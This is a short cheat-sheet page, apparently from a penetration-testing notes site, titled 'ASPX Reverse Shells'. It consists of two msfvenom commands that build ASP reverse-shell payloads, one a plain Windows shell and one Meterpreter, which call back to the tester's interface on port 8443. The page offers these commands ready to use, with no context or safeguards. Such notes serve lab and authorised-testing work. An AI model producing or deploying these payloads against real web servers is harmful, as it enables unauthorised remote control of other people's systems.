---
title: ASPX Reverse Shells
layout: default
nav_order: 1
parent: Reverse Shells

---

# ASPX Reverse Shells
{: .no_toc }
## Table of Contents
{: .no_toc .text-delta }
1. TOC
{:toc}

### Non-meterpreter shell

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=tun0 LPORT=8443 -f asp > shell.asp
```

### Meterpreter shell

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=8443 -f asp > shell.asp
```

